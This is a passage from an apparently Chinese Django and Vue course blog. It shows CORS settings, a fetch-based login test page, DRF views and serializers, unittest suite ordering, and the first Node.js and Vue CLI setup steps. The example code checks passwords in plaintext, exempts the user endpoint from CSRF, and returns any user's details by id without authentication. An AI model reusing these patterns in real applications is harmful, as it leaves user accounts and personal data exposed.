class=\"string\">&#x27;PUT&#x27;</span>,</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># 跨域允许的头部参数（可选）</span></span><br><span class=\"line\">CORS_ALLOW_HEADERS = (</span><br><span class=\"line\">\t<span class=\"string\">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;X_FILENAME&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;accept_encoding&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;authorization&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;content-type&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;dnt&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;origin&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;user-agent&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;x-csrftoken&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;x-requested-with&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Pragma&#x27;</span>,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-3-测试跨域请求\"><a href=\"#1-3-测试跨域请求\" class=\"headerlink\" title=\"1.3 测试跨域请求\"></a>1.3 测试跨域请求</h3><p>在static静态资源下，创建index.html，内容如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width,initial-scale=1&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>主页<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;login()&quot;</span>&gt;</span>登录<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;result&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">login</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        url = <span class=\"string\">&#x27;http://localhost:8000/user/?action=login&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        data = &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">name</span>: <span class=\"string\">&quot;disen888666&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">password</span>: <span class=\"string\">&#x27;Disen666&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">fetch</span>(url, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">method</span>: <span class=\"string\">&#x27;post&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">body</span>:<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(data),</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">headers</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;).<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">resp</span> =&gt;</span> resp.<span class=\"title function_\">json</span>())</span></span><br><span class=\"line\"><span class=\"language-javascript\">            .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data);</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;result&#x27;</span>).<span class=\"property\">innerHTML</span> = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(data.<span class=\"property\">data</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"title function_\">get_info</span>(data.<span class=\"property\">data</span>.<span class=\"property\">id</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;, <span class=\"number\">2000</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">get_info</span>(<span class=\"params\">id</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&#x27;开始查询用户: &#x27;</span>+id)</span></span><br><span class=\"line\"><span class=\"language-javascript\">        url = <span class=\"string\">&#x27;http://localhost:8000/user/?id=&#x27;</span>+id;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">fetch</span>(url).<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">resp</span>=&gt;</span>resp.<span class=\"title function_\">json</span>())</span></span><br><span class=\"line\"><span class=\"language-javascript\">            .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">data</span>=&gt;</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"keyword\">if</span>(data.<span class=\"property\">code</span>==<span class=\"number\">200</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                     <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;result&#x27;</span>).<span class=\"property\">innerHTML</span> = data.<span class=\"property\">data</span>.<span class=\"property\">phone</span>+<span class=\"string\">&quot;---&gt;&quot;</span>+data.<span class=\"property\">data</span>.<span class=\"property\">name</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;result&#x27;</span>).<span class=\"property\">innerHTML</span> = data.<span class=\"property\">msg</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">            &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在后端的user模块中创建serializers.py，内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"comment\"># coding: utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> rest_framework <span class=\"keyword\">import</span> serializers</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> .models <span class=\"keyword\">import</span> AppUser</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserSerializer</span>(serializers.ModelSerializer):</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Meta</span>:</span><br><span class=\"line\">        model = AppUser</span><br><span class=\"line\">        fields = (<span class=\"string\">&#x27;id&#x27;</span>, <span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;phone&#x27;</span>, <span class=\"string\">&#x27;email&#x27;</span>, <span class=\"string\">&#x27;img1&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>user模块的urls.py的内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"comment\"># coding: utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.urls <span class=\"keyword\">import</span> path</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.views.decorators.csrf <span class=\"keyword\">import</span> csrf_exempt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> .views <span class=\"keyword\">import</span> AppUserView</span><br><span class=\"line\"></span><br><span class=\"line\">app_name = <span class=\"string\">&#x27;user&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;&#x27;</span>, csrf_exempt(AppUserView.as_view())),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>配置总路由：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.urls <span class=\"keyword\">import</span> path, include</span><br><span class=\"line\"></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;user/&#x27;</span>, include(<span class=\"string\">&#x27;user.urls&#x27;</span>)),</span><br><span class=\"line\">    ...</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>user模块的views.py内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.http <span class=\"keyword\">import</span> JsonResponse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Create your views here.</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> rest_framework.views <span class=\"keyword\">import</span> APIView</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> .serializer <span class=\"keyword\">import</span> UserSerializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> .models <span class=\"keyword\">import</span> AppUser</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">AppUserView</span>(<span class=\"title class_ inherited__\">APIView</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">self,request</span>):</span><br><span class=\"line\">        name = request.data.get(<span class=\"string\">&#x27;name&#x27;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">        password = request.data.get(<span class=\"string\">&#x27;password&#x27;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">all</span>((name, password)):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">100</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;用户名或口令不能为空&#x27;</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            qs = AppUser.objects.<span class=\"built_in\">filter</span>(name=name)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> qs.exists():</span><br><span class=\"line\">                <span class=\"comment\"># 获取登录的用户信息</span></span><br><span class=\"line\">                login_user = qs.first()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> login_user.auth_key == password:</span><br><span class=\"line\">                    info = UserSerializer(login_user, many=<span class=\"literal\">False</span>).data</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                        <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">200</span>,</span><br><span class=\"line\">                        <span class=\"string\">&#x27;data&#x27;</span>: &#123;</span><br><span class=\"line\">                            <span class=\"string\">&#x27;id&#x27;</span>: login_user.<span class=\"built_in\">id</span>,</span><br><span class=\"line\">                            <span class=\"string\">&#x27;phone&#x27;</span>: login_user.phone</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">102</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;用户名或口令不正确，请重试或联系管理员&#x27;</span></span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                    <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">101</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;查无此用户, 可能未激活&#x27;</span></span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">regist</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get</span>(<span class=\"params\">self,request</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 读取用户信息（读取详情）</span></span><br><span class=\"line\">        <span class=\"built_in\">id</span> = request.GET.get(<span class=\"string\">&#x27;id&#x27;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">id</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">100</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;必须提供id参数&#x27;</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            login_user = AppUser.objects.get(pk=<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">200</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;data&#x27;</span>: UserSerializer(login_user).data</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;code&#x27;</span>: <span class=\"number\">101</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;查无此用户&#x27;</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">post</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 用户登录或注册</span></span><br><span class=\"line\"></span><br><span class=\"line\">        action = request.GET.get(<span class=\"string\">&#x27;action&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> action == <span class=\"string\">&#x27;login&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.login(request)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> action == <span class=\"string\">&#x27;regist&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.regist(request)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">                <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;请求无效， 请确定是否提供action参数&#x27;</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">put</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 修改用户信息（头像、口令、激活）</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 注销用户</span></span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>【注意】APIView生成的request.data表示上传的json或原始的数据，是一个dict类型。</p>\n<p>对于get请求，前端的代码如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">function get_info(id) &#123;</span><br><span class=\"line\">        alert(&#x27;开始查询用户: &#x27;+id)</span><br><span class=\"line\">        url = &#x27;http://localhost:8000/user/?id=&#x27;+id;</span><br><span class=\"line\">        fetch(url).then(resp=&gt;resp.json())</span><br><span class=\"line\">            .then(data=&gt;&#123;</span><br><span class=\"line\">                if(data.code==200)&#123;</span><br><span class=\"line\">                     document.getElementById(&#x27;result&#x27;).innerHTML = data.data.phone+&quot;---&gt;&quot;+data.data.name;</span><br><span class=\"line\">                &#125;else&#123;</span><br><span class=\"line\">                    document.getElementById(&#x27;result&#x27;).innerHTML = data.msg;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以在登录成功后，根据响应的id，继续查询用户的详细信息。</p>\n<h2 id=\"二、接口的单元测试（自动化）\"><a href=\"#二、接口的单元测试（自动化）\" class=\"headerlink\" title=\"二、接口的单元测试（自动化）\"></a>二、接口的单元测试（自动化）</h2><p>针对unittest的TestCase单元测试类，和它们的每个测试单元函数的执行顺序问题。</p>\n<h3 id=\"2-1-单个测试\"><a href=\"#2-1-单个测试\" class=\"headerlink\" title=\"2.1 单个测试\"></a>2.1 单个测试</h3><p>在test模块下，test_user.py中声明单元测试类和测试业务功能方法，详细如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> unittest <span class=\"keyword\">import</span> TestCase</span><br><span class=\"line\"><span class=\"keyword\">import</span> unittest</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserTestCase</span>(<span class=\"title class_ inherited__\">TestCase</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">setUp</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---init--&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_02_get_info</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--info---&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_01_login</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--login---&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">tearDown</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---over---&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    unittest.main()</span><br></pre></td></tr></table></figure>\n\n<p>每一个单元方法执行时，之前会执行setUp()初始化资源，之后会执行tearDown()回收资源。</p>\n<p>【注意】多个方法名，默认按ASCII排序，不按声明的先后顺序，所以常以“test序号业务名称()”来声明函数。</p>\n<p>以上代码常规的单个测试单元类，也可以使用TestSuite和TextTestRunner两个类来运行。如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> unittest <span class=\"keyword\">import</span> TestSuite, TextTestRunner</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">suite</span>():</span><br><span class=\"line\">    suite_ = TestSuite()  <span class=\"comment\"># 创建测试套件类</span></span><br><span class=\"line\"></span><br><span class=\"line\">    suite_.addTest(UserTestCase.test_get_info)  <span class=\"comment\"># 添加套件的测试方法</span></span><br><span class=\"line\">    suite_.addTest(UserTestCase.test_login)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> suite_</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    runner = TextTestRunner()</span><br><span class=\"line\">    runner.run(suite())</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-多个套件的单元测试\"><a href=\"#2-2-多个套件的单元测试\" class=\"headerlink\" title=\"2.2 多个套件的单元测试\"></a>2.2 多个套件的单元测试</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"comment\"># coding: utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> unittest <span class=\"keyword\">import</span> TestSuite, TextTestRunner, TestCase</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OrderTestCase</span>(<span class=\"title class_ inherited__\">TestCase</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_01_add</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--add order--&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_02_pay</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--pay order--&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserTestCase</span>(<span class=\"title class_ inherited__\">TestCase</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">setUp</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---init--&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_02_get_info</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--info---&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_01_login</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--login---&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">tearDown</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---over---&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">suite1</span>():</span><br><span class=\"line\">    suite_ = TestSuite()</span><br><span class=\"line\"></span><br><span class=\"line\">    suite_.addTest(UserTestCase.test_01_login)</span><br><span class=\"line\">    suite_.addTest(UserTestCase.test_02_get_info)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> suite_</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">suite2</span>():</span><br><span class=\"line\">    suite_ = TestSuite()</span><br><span class=\"line\"></span><br><span class=\"line\">    suite_.addTest(OrderTestCase.test_01_add)</span><br><span class=\"line\">    suite_.addTest(OrderTestCase.test_02_pay)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> suite_</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    TextTestRunner().run(TestSuite((suite2(), suite1())))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>TestSuite()中可以传入多个元组对象，运行的顺序则从左开始向右进行。</p>\n<h2 id=\"WEB后端第25天-Django项目第5天\"><a href=\"#WEB后端第25天-Django项目第5天\" class=\"headerlink\" title=\"# WEB后端第25天-Django项目第5天\"></a># WEB后端第25天-Django项目第5天</h2><h2 id=\"一、vue-js的vue-cli的应用\"><a href=\"#一、vue-js的vue-cli的应用\" class=\"headerlink\" title=\"一、vue.js的vue cli的应用\"></a>一、vue.js的vue cli的应用</h2><h3 id=\"1-1-安装node-js\"><a href=\"#1-1-安装node-js\" class=\"headerlink\" title=\"1.1 安装node.js\"></a>1.1 安装node.js</h3><p>node.js官网：<a href=\"https://nodejs.org/en/download/\">https://nodejs.org/en/download/</a></p>\n<p>安装完成后，需要配置global和cache缓存的目录<code>（默认在&#123;User_home&#125;/AppData/Roaming/npm）</code>下，可以执行以下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm config set prefix &quot;E:\\nodejs\\node_global&quot;</span><br><span class=\"line\">npm config set cache &quot;E:\\nodejs\\node_cache&quot;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">另外，在环境变量path中，增加node_global的全路径</span><br><span class=\"line\"></span><br><span class=\"line\">```shell</span><br><span class=\"line\">E:\\nodejs\\node_global\\node_modules</span><br></pre></td></tr></table></figure>\n\n<p>验证安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">node -v</span><br><span class=\"line\">npm -v</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-安装Vue-CLI脚手架\"><a href=\"#1-2-安装Vue-CLI脚手架\" class=\"headerlink\" title=\"1.2 安装Vue CLI脚手架\"></a>1.2 安装Vue CLI脚手架</h3><p>文档：<a href=\"https://cli.vuejs.org/zh/\">https://cli.vuejs.org/zh/</a></p>\n<p><a href=\"https://cn.vuejs.org/guide/quick-start.html\">https://cn.vuejs.org/guide/quick-start.html</a></p>\n<p>安装@vue/cli的模块，安装之后，vue的相关命令则可以使用。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g @vue/cli</span><br></pre></td></tr></table></figure>\n\n<p>创建vue项目</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">vue create 